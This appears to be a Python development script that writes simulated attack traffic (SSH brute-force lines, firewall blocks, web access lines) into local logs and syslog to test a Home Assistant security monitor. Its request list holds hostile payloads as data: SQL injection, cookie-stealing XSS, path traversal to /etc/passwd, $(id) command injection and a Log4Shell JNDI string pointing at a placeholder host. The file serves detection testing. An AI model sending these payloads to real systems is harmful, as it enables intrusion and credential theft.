#!/usr/bin/env python3
"""Generate realistic attack traffic for the LOCAL development instance.

It never touches third-party systems: it only
  * appends sample lines to log files under ./dev/logs (read by HA Sentinel),
  * sends syslog datagrams to a local receiver (default 127.0.0.1:5514/udp),
  * optionally performs failed logins against your own local HA (--ha-url).

Usage:
    python3 scripts/simulate_attacks.py                 # one burst of everything
    python3 scripts/simulate_attacks.py --loop 10       # a burst every 10 s
    python3 scripts/simulate_attacks.py --ha-url http://localhost:8123
"""

from __future__ import annotations

import argparse
from datetime import datetime
import json
from pathlib import Path
import random
import socket
import time
import urllib.error
import urllib.request

ROOT = Path(__file__).resolve().parent.parent
LOG_DIR = ROOT / "dev" / "logs"

# RFC 5737 documentation ranges: never real hosts.
ATTACKERS = [f"{net}.{i}" for net in ("192.0.2", "198.51.100", "203.0.113") for i in (7, 23, 42, 99)]

WEB_REQUESTS = [
    ("GET", "/.env", "Mozilla/5.0 zgrab/0.x"),
    ("GET", "/wp-login.php", "Mozilla/5.0"),
    ("GET", "/index.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users", "sqlmap/1.8"),
    ("GET", "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", "Mozilla/5.0"),
    ("GET", "/static/..%2f..%2f..%2fetc/passwd", "curl/8.4.0"),
    ("GET", "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id)", "Mozilla/5.0"),
    ("GET", "/", "${jndi:ldap://203.0.113.66/a}"),
    ("GET", "/phpmyadmin/index.php", "Mozilla/5.0 (compatible; Nuclei)"),
    ("POST", "/xmlrpc.php", "Mozilla/5.0"),
    ("GET", "/api/states", "python-requests/2.31"),  # benign: must NOT be flagged
]
USERS = ["root", "admin", "pi", "ubuntu", "homeassistant", "test", "oracle"]


def _ts_syslog() -> str:
    return datetime.now().strftime("%b %d %H:%M:%S")


def _ts_clf() -> str:
    return datetime.now().astimezone().strftime("%d/%b/%Y:%H:%M:%S %z")


def ssh_lines(n: int) -> list[str]:
    ip = random.choice(ATTACKERS)
    out = []
    for _ in range(n):
        user = random.choice(USERS)
        port = random.randint(30000, 65000)
        out.append(
            f"{_ts_syslog()} gateway sshd[{random.randint(100, 9999)}]: Failed password for {user} from {ip} port {port} ssh2"
        )
    return out


def web_lines(n: int) -> list[str]:
    out = []
    for _ in range(n):
        method, path, ua = random.choice(WEB_REQUESTS)
        ip = random.choice(ATTACKERS)
        out.append(f'{ip} - - [{_ts_clf()}] "{method} {path} HTTP/1.1" 404 153 "-" "{ua}"')
    return out


def firewall_lines(n: int) -> list[str]:
    ip = random.choice(ATTACKERS)
    ports = random.sample(
        [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 1433, 3306, 3389, 5900, 8080, 8443], k=min(n, 16)
    )
    return [
        f"{_ts_syslog()} gateway kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:00 SRC={ip} DST=192.168.1.10 "
        f"LEN=44 TOS=0x00 PROTO=TCP SPT={random.randint(1024, 65535)} DPT={port} WINDOW=1024 SYN URGP=0"
        for port in ports
    ]


def append(name: str, lines: list[str]) -> None:
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    with (LOG_DIR / name).open("a", encoding="utf-8") as fh:
        fh.write("\n".join(lines) + "\n")
    print(f"  + {len(lines):3d} linhas em dev/logs/{name}")


def send_syslog(host: str, port: int, lines: list[str]) -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        for line in lines:
            sock.sendto(f"<38>{line}".encode(), (host, port))
    print(f"  + {len(lines):3d} mensagens syslog para {host}:{port}/udp")


def ha_failed_logins(url: str, attempts: int) -> None:
    """Start a login flow on YOUR local HA and submit wrong passwords."""
    base = url.rstrip("/")
    for _ in range(attempts):
        try:
            req = urllib.request.Request(
                f"{base}/auth/login_flow",
                data=json.dumps(
                    {"client_id": f"{base}/", "handler": ["homeassistant", None], "redirect_uri": f"{base}/"}
                ).encode(),
                headers={"Content-Type": "application/json"},
            )
            flow = json.load(urllib.request.urlopen(req, timeout=5))
            req = urllib.request.Request(
                f"{base}/auth/login_flow/{flow['flow_id']}",
                data=json.dumps(
                    {"username": random.choice(USERS), "password": "wrong-password", "client_id": f"{base}/"}
                ).encode(),
                headers={"Content-Type": "application/json"},
            )
            urllib.request.urlopen(req, timeout=5).read()
        except (urllib.error.URLError, KeyError, ValueError) as err:
            print(f"  ! login falhou: {err}")
            return
    print(f"  + {attempts:3d} logins inválidos em {base}")


def burst(args: argparse.Namespace) -> None:
    print(time.strftime("%H:%M:%S"), "rajada de ataques simulados")
    append("auth.log", ssh_lines(random.randint(3, 8)))
    append("access.log", web_lines(random.randint(4, 10)))
    append("ufw.log", firewall_lines(random.randint(4, 14)))
    if not args.no_syslog:
        send_syslog(args.syslog_host, args.syslog_port, ssh_lines(3) + firewall_lines(5))
    if args.ha_url:
        ha_failed_logins(args.ha_url, args.ha_attempts)


def main() -> None:
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--loop", type=float, default=0, help="repeat every N seconds (0 = once)")
    parser.add_argument("--syslog-host", default="127.0.0.1")
    parser.add_argument("--syslog-port", type=int, default=5514)
    parser.add_argument("--no-syslog", action="store_true")
    parser.add_argument("--ha-url", help="local HA URL for failed logins, e.g. http://localhost:8123")
    parser.add_argument("--ha-attempts", type=int, default=3)
    args = parser.parse_args()
    if args.ha_url and not any(h in args.ha_url for h in ("localhost", "127.0.0.1", "[::1]")):
        parser.error("--ha-url só é permitido para uma instância local (localhost)")
    burst(args)
    while args.loop > 0:
        time.sleep(args.loop)
        burst(args)


if __name__ == "__main__":
    main()
